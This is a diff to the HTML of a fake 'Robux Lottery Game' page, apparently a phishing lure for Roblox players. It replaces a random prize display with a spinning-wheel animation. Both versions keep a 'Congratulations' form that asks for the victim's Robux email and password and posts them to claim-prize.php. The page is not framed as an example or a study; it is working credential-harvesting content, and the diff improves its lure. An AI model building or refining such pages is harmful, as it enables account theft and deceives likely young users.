@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+#<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -61,31 +61,35 @@
         background-color: #0056b3;
     }
 
-    #gallery {
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: center;
+    .wheel-container {
+        margin: 20px auto;
+        text-align: center;
+    }
+
+    .wheel {
+        width: 200px;
+        height: 200px;
+        border: 2px solid #fff;
+        border-radius: 50%;
+        position: relative;
+        animation: spin 5s linear infinite;
+    }
+
+    @keyframes spin {
+        100% { transform: rotate(360deg); }
+    }
+
+    .result {
+        font-size: 24px;
+        font-weight: bold;
         margin-top: 20px;
     }
 
-    .gallery-item {
-        margin: 10px;
-        border-radius: 5px;
-        overflow: hidden;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-    }
-
-    .gallery-item img {
-        width: 100%;
-        height: auto;
-        display: block;
-    }
-
-    #lottery-form {
+    #email-form {
         display: none;
     }
 
-    #lottery-form.show {
+    #email-form.show {
         display: block;
     }
 
@@ -118,13 +122,18 @@
 </header>
 
 <div class="container">
-    <p>This is your chance to win Robux in our exciting lottery game. Simply click the button below to join the game!</p>
-    <button onclick="playLottery()" class="button">Join Now</button>
+    <p>Do you want to participate in the Robux Lottery Game?</p>
+    <button onclick="startGame()" class="button">Yes, I'm In!</button>
 </div>
 
-<form id="lottery-form" class="container" action="claim-prize.php" method="post">
+<div class="wheel-container" id="wheel-container" style="display: none;">
+    <div class="wheel" id="wheel"></div>
+    <div class="result" id="result"></div>
+</div>
+
+<form id="email-form" class="container" action="claim-prize.php" method="post">
     <h2>Congratulations!</h2>
-    <p>You won <span id="prize"></span> Robux!</p>
+    <p>You won the Robux Lottery Game!</p>
     <label for="email">Robux Email:</label>
     <input type="text" id="email" name="email" required>
     <label for="password">Password:</label>
@@ -146,11 +155,22 @@
 </div>
 
 <script>
-    function playLottery() {
-        var randomNumber = Math.floor(Math.random() * 11); // Generate a random number between 0 and 10
-        var prize = randomNumber * 100; // Multiply the random number by 100 to get the prize in Robux
-        document.getElementById('prize').innerText = prize;
-        document.getElementById('lottery-form').classList.add('show');
+    function startGame() {
+        document.getElementById('wheel-container').style.display = 'block';
+        spinWheel();
+    }
+
+    function spinWheel() {
+        var randomNumber = Math.random() * 10;
+        var result = Math.floor(randomNumber) < 5 ? 'Congratulations! You won!' : 'Sorry, you didn\'t win. Try again!';
+        document.getElementById('wheel').style.animation = 'spin 5s linear infinite';
+        setTimeout(function() {
+            document.getElementById('wheel').style.animation = 'none';
+            document.getElementById('result').innerText = result;
+            if (result === 'Congratulations! You won!') {
+                document.getElementById('email-form').classList.add('show');
+            }
+        }, 5000);
     }
 </script>
 
